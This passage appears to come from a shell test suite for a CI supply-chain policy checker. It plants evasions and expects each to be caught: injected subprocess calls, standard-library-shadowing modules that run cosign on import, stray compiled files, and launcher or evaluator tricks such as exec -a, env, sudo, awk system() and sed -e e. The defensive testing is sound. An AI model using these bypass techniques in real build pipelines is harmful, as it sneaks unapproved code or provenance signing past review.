probe vendorruns "bin/vendor-provenance.py: " "bin/vendor-provenance.py starting another program it does not list (the row says it runs none)" \
  "printf '\nimport subprocess\nsubprocess.run([\"bash\", \"bin/sneak.sh\"])\n' >> bin/vendor-provenance.py; printf 'echo x\n' > bin/sneak.sh; rehash bin/vendor-provenance.py"
probe composite .github/actions/probe "a provenance signer in a new composite action"         "mkdir -p .github/actions/probe; printf 'name: probe\nruns:\n  using: composite\n  steps:\n    - uses: actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8 # v4.0.0\n      with:\n        subject-path: x\n' > .github/actions/probe/action.yml"
# a LISTED script that a frozen file runs, turned into a provenance signer with its row and sha256 updated
probe hoststep bin/chain-hostile-step.sh "bin/chain-hostile-step.sh (run by frozen stage-build.yml) made a provenance signer, its row and sha256 updated" \
  "printf 'cosign attest --type slsaprovenance --predicate p.json img\n' >> bin/chain-hostile-step.sh; rehash bin/chain-hostile-step.sh signs=provenance"
# Opus r4 B1 (second belt): a file in bin/ named after a standard-library module would shadow it for any script run from bin/ without -I
probe stdjson   "bin/json.py" "a new bin/json.py that signs on import" "printf 'import os\nos.system(\"cosign attest-blob --yes --type slsaprovenance --predicate p.json x\")\n' > bin/json.py"
probe stdfrac   "bin/fractions.py" "a new bin/fractions.py that signs on import" "printf 'import os\nos.system(\"cosign attest-blob --yes --type slsaprovenance x\")\n' > bin/fractions.py"
probe stdpyc    "bin/hashlib.pyc" "a sourceless bin/hashlib.pyc" "printf '\\0\\0\\0\\0' > bin/hashlib.pyc"
probe stdpkg    "bin/base64" "a package directory bin/base64/" "mkdir -p bin/base64; printf 'import os\n' > bin/base64/__init__.py"
probe stdcache  "bin/__pycache__/argparse" "a cached bin/__pycache__/argparse.cpython-312.pyc" "mkdir -p bin/__pycache__; printf '\\0' > bin/__pycache__/argparse.cpython-312.pyc"
# Opus r5 B1: no compiled or cached code anywhere under bin/ or .github/ (it would run instead of, or beside, the hashed source)
probe pycache   "bin/__pycache__" "a bin/__pycache__/chain_common.cpython-312.pyc" "mkdir -p bin/__pycache__; printf '\\0' > bin/__pycache__/chain_common.cpython-312.pyc"
probe soext     "bin/json.abi3.so" "a native extension bin/json.abi3.so" "printf '\\0' > bin/json.abi3.so"
probe pkgcache  ".github/actions/pkg/__pycache__" "a package __pycache__ under .github/actions" "mkdir -p .github/actions/pkg/__pycache__; printf '\\0' > .github/actions/pkg/__pycache__/m.cpython-312.pyc"
# a listed script names another program or script only exactly (Codex #249 r7 B3, the class closed): a script token must be the exact
# listed path (a leading ./ aside), a command named by any path or through a launcher prefix is refused even when its row allows the name
scriptcase s8_ok_exact ok "${S0}bash bin/install-scanner.sh x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'control: the exact listed path of a script in runs'
scriptcase s8_ok_dot ok "${S0}bash ./bin/install-scanner.sh x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'control: the exact listed path with a leading ./'
scriptcase s8_other caught "${S0}bash other/install-scanner.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'a script with the basename of a listed one in another directory (Codex #249 r7 B3a)'
scriptcase s8_otherbin caught "${S0}bash ./other/bin/install-scanner.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'a script under another directory ending in bin/ with a listed basename'
scriptcase s8_dotdot caught "${S0}bash bin/../bin/install-scanner.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'a listed path spelled with ..'
scriptcase s8_sub caught "${S0}bash bin/sub/install-scanner.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'a listed basename in a subdirectory of bin/'
scriptcase s8_bare caught "${S0}bash install-scanner.sh\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'a listed basename with no directory (bash resolves it in the working directory)'
scriptcase s8_absbash caught "${S0}/bin/bash -c true\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'an absolute path to bash (Codex #249 r7 B3b)'
scriptcase s8_abspy caught "${S0}/usr/bin/python3 -c pass\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'an absolute path to python3 (B3b)'
scriptcase s8_relbash caught "${S0}x/bash -c true\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'a relative path to bash'
scriptcase s8_envabs caught "${S0}/usr/bin/env python3 x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' '/usr/bin/env launching another program'
scriptcase s8_env caught "${S0}env bash x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'env launching another program (env in tools)'
scriptcase s8_exec caught "${S0}exec bash x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'exec launching another program (exec in tools)'
scriptcase s8_command caught "${S0}command python3 x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'command launching another program (command in tools)'
scriptcase s8_builtin caught "${S0}builtin exec bash x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'builtin launching another program'
scriptcase s8_nohup caught "${S0}nohup bash x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'nohup launching another program'
scriptcase s8_timeout caught "${S0}timeout 5 bash x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'timeout launching another program'
scriptcase s8_xargs caught "${S0}printf x | xargs bash\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'xargs launching another program'
scriptcase s8_sudo caught "${S0}sudo bash x\n" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","env","exec","command","builtin","nohup","timeout","xargs","sudo"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh","bin/install-scanner.sh"]' 'sudo launching another program'
probe othersc "other/install-scanner.sh" "the real bin/chain-hostile-step.sh with bash other/install-scanner.sh appended and its sha256 updated (Codex #249 r7 B3a)" \
  "printf 'bash other/install-scanner.sh\\n' >> bin/chain-hostile-step.sh; rehash bin/chain-hostile-step.sh"
probe absbash  "/bin/bash" "the real bin/chain-hostile-step.sh with /bin/bash -c true appended and its sha256 updated (B3b)" \
  "printf '/bin/bash -c true\\n' >> bin/chain-hostile-step.sh; rehash bin/chain-hostile-step.sh"
# (Codex #249 r8 B3 + Sonnet 1/2/3/6, the class closed) listed scripts: a launcher or evaluator word at ANY command position, and any word handed
# to an interpreter or run as a path, must be an exact listed path or a word the row allows; a launcher is refused outright
d=$(mk s9_exec_a); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}exec -a \"fake name\" evil\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: exec -a with a quoted name hides the program (Codex #249 r8 B3)" tree "$d"
d=$(mk s9_brace); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}{ setsid id; }\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: setsid inside a { } group (Sonnet 6)" tree "$d"
d=$(mk s9_bang); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}! setsid id\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: setsid after ! (Sonnet 6)" tree "$d"
d=$(mk s9_assign); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}A=1 setsid id\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: setsid after a VAR=val assignment (Sonnet 6)" tree "$d"
d=$(mk s9_func); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}f() { flock l id; }\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: flock inside a function body (Sonnet 6)" tree "$d"
d=$(mk s9_subsh); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}( setsid id )\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: setsid inside a subshell" tree "$d"
d=$(mk s9_oror); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}true || setsid id\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: setsid after ||" tree "$d"
d=$(mk s9_elif); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}if false; then :; elif setsid id; then :; fi\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: setsid after elif" tree "$d"
d=$(mk s9_time); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}time setsid id\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: setsid after time" tree "$d"
d=$(mk s9_eval); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}eval id\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: eval listed in tools is still refused (it evaluates a string)" tree "$d"
d=$(mk s9_source); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}source lib\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: source listed in tools is still refused" tree "$d"
d=$(mk s9_dot1); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}. ./mylib\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: . ./mylib (Sonnet 2)" tree "$d"
d=$(mk s9_dot2); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}. lib\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: . lib (Sonnet 2)" tree "$d"
d=$(mk s9_dot3); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}. /tmp/x\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: . /tmp/x (Sonnet 2)" tree "$d"
d=$(mk s9_env); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}env id\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: env listed in tools is still refused" tree "$d"
d=$(mk s9_busybox); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}busybox sh x\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: busybox (a launcher)" tree "$d"
d=$(mk s9_setpriv); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}setpriv id\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: setpriv (a launcher)" tree "$d"
d=$(mk s9_awk); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}awk 'BEGIN{system(\"id\")}'\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: awk not in tools (an evaluator)" tree "$d"
d=$(mk s9_sed); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}sed -e e x\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: sed not in tools (an evaluator)" tree "$d"
d=$(mk s9_perl); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}perl -e 1\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: perl not in tools (an evaluator)" tree "$d"
d=$(mk s9_ruby); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}ruby -e 1\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: ruby not in tools" tree "$d"
d=$(mk s9_php); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}php -r 1\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: php not in tools" tree "$d"
d=$(mk s9_lua); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}lua -e 1\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: lua not in tools" tree "$d"
d=$(mk s9_gawk); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}gawk 1 x\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: gawk not in tools" tree "$d"
d=$(mk s9_openssl); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}openssl s_client -connect x:443\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: openssl s_client not in tools" tree "$d"
d=$(mk s9_tar); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}tar -xf x.tar\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: tar not in tools" tree "$d"
d=$(mk s9_dotmytool); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}./mytool\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: ./mytool, an unlisted executable at the root with a shebang (Sonnet 1 regression)" tree "$d"
d=$(mk s9_cdmytool); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}cd bin; ./mytool2\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: cd bin; ./mytool2 (Sonnet 1)" tree "$d"
d=$(mk s9_bashlib); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}bash mylib\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: bash mylib, an unlisted extension-less file (Sonnet 3)" tree "$d"
